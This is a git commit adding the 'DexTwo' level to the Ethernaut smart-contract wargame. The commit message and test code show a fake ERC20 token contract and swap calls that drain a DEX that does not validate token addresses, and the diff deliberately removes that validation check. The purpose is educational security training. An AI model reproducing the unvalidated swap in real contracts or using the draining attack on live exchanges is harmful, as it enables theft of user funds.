fd596a8fbffec181e28f6dacbf6c304ab72b6bd5
Scott Tsai <scottt.tw@gmail.com>
2021-09-13 23:52:41 +0800

    New Level: DexTwo: Attack of the Evil Token (#250)
    * New Level: Dex 2 (Attack of the Evil ERC20 Token)
    
    `Dex.sol` currently doesn't check that the ERC20 addresses are the ones it expects.
    
    The player can supply a the address of an `DexAttackToken` instance as the input to `Dex.swap` and drain the contract of its original tokens.
    
    * Add a `require((from == token1 && to == token2) ... )` to the current `Dex` level
    * Create a new level, Dex 2, with that vulnerability
    * Explicitly require the player to drain `Dex` of both `token1` and `token2` balances
    * Give the player a hint that interacting with a ERC20 token contract
    
    * New Level: DexTwo: Attack of the Evil Token
    
    The `Dex` level in Ethernaut, currently doesn't check that the ERC20 addresses are the ones it expects:
    
    ```
    contract Dex {
      function swap(address from, address to, uint amount) public {
            require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
            uint swap_amount = get_swap_amount(from, to, amount);
            IERC20(from).transferFrom(msg.sender, address(this), amount);
            IERC20(to).approve(address(this), swap_amount);
            IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
        }
        function get_swap_amount(address from, address to, uint amount) public view returns(uint){
            return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
        }
    }
      ```
    
    The player can supply the address of an `DexAttackToken` instance as the input:
    
    ```
    contract DexAttackToken {
        function balanceOf(address) external pure returns (uint256) {
            return 1;
        }
    
        function transferFrom(
            address,
            address,
            uint256
        ) external pure returns (bool) {
            return true;
        }
    }
    ```
    
    Swapping from `DexAttackToken` to `token1` and `token2` would then drain the balance of the Dex contract:
    
    ```
    dex.swap(attackToken.address, token1.address, 1)
    dex.swap(attackToken.address, token2.address, 1)
    ```
    
    This patch proposes the following:
    
    * Add a `require((from == token1 && to == token2) ... )` to `swap` in the current `Dex` level
    * Create a new level, Dex Two, which keeps the vulnerability to the "evil token attack"
    * Explicitly require the player to drain `DexTwo` of both `token1` and `token2` balances
    * Give the player a hint to try an attack vector with a custom ERC20 token contract
    
    * deploy on rinkeby
    
    * remove old test file
    
    Co-authored-by: Dario <dariolobuglio@gmail.com>

--- contracts/contracts/levels/DexTwo.sol
+++ contracts/contracts/levels/DexTwo.sol
@@ -5,7 +5,7 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import '@openzeppelin/contracts/math/SafeMath.sol';
 
-contract Dex  {
+contract DexTwo  {
   using SafeMath for uint;
   address public token1;
   address public token2;
@@ -15,7 +15,6 @@ contract Dex  {
   }
 
   function swap(address from, address to, uint amount) public {
-    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
     uint swap_amount = get_swap_amount(from, to, amount);
     IERC20(from).transferFrom(msg.sender, address(this), amount);
@@ -32,8 +31,8 @@ contract Dex  {
   }
 
   function approve(address spender, uint amount) public {
-    SwappableToken(token1).approve(spender, amount);
-    SwappableToken(token2).approve(spender, amount);
+    SwappableTokenTwo(token1).approve(spender, amount);
+    SwappableTokenTwo(token2).approve(spender, amount);
   }
 
   function balanceOf(address token, address account) public view returns (uint){
@@ -41,7 +40,7 @@ contract Dex  {
   }
 }
 
-contract SwappableToken is ERC20 {
+contract SwappableTokenTwo is ERC20 {
   constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
         _mint(msg.sender, initialSupply);
   }
---
+++ contracts/test/levels/DexTwo.test.js
@@ -0,0 +1,70 @@
+const DexTwoFactory = artifacts.require('./levels/DexTwoFactory.sol')
+const SwappableTokenTwo = artifacts.require('SwappableTokenTwo')
+const DexTwoAttackToken = artifacts.require('DexTwoAttackToken')
+const DexTwo = artifacts.require('./levels/DexTwo.sol')
+
+const Ethernaut = artifacts.require('./Ethernaut.sol')
+const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
+const utils = require('../utils/TestUtils')
+
+
+contract('DexTwo', function (accounts) {
+
+  let ethernaut
+  let level
+  let owner = accounts[1]
+  let player = accounts[0]
+  let instance
+
+  before(async function () {
+    ethernaut = await Ethernaut.new()
+    level = await DexTwoFactory.new()
+    await ethernaut.registerLevel(level.address)
+  });
+
+  it('should fail if the player didnt solve the level', async function() {
+    const instance = await utils.createLevelInstance(ethernaut, level.address, player, DexTwo)
+    const completed = await utils.submitLevelInstance(
+      ethernaut,
+      level.address,
+      instance.address,
+      player
+    )
+
+    assert.isFalse(completed)
+  });
+
+  it('should allow the player to solve the level', async function () {
+    const instance = await utils.createLevelInstance(ethernaut, level.address, player, DexTwo)
+
+    const [token1Addr, token2Addr] = await Promise.all([ instance.token1(), instance.token2() ])
+    const [token1, token2] = [token1Addr, token2Addr].map((a) => new SwappableTokenTwo(a))
+    let dexBalances = await Promise.all([token1.balanceOf(instance.address), token2.balanceOf(instance.address)])
+    let playerBalances = await Promise.all([token1.balanceOf(player), token2.balanceOf(player)])
+    assert.equal(dexBalances[0], 100)
+    assert.equal(dexBalances[1], 100)
+    assert.equal(playerBalances[0], 10)
+    assert.equal(playerBalances[1], 10)
+
+    const t = await DexTwoAttackToken.new()
+
+    // Drain funds through swap
+    await instance.swap(t.address, token1.address, 1, { from: player })
+    await instance.swap(t.address, token2.address, 1, { from: player })
+    dexBalances = await Promise.all([token1.balanceOf(instance.address), token2.balanceOf(instance.address)])
+    playerBalances = await Promise.all([token1.balanceOf(player), token2.balanceOf(player)])
+    assert.equal(dexBalances[0], 0)
+    assert.equal(dexBalances[1], 0)
+    assert.equal(playerBalances[0], 110)
+    assert.equal(playerBalances[1], 110)
+
+    // Check win.
+    const ethCompleted = await utils.submitLevelInstance(
+      ethernaut,
+      level.address,
+      instance.address,
+      player
+    )
+    assert.equal(ethCompleted, true)
+  });
+})
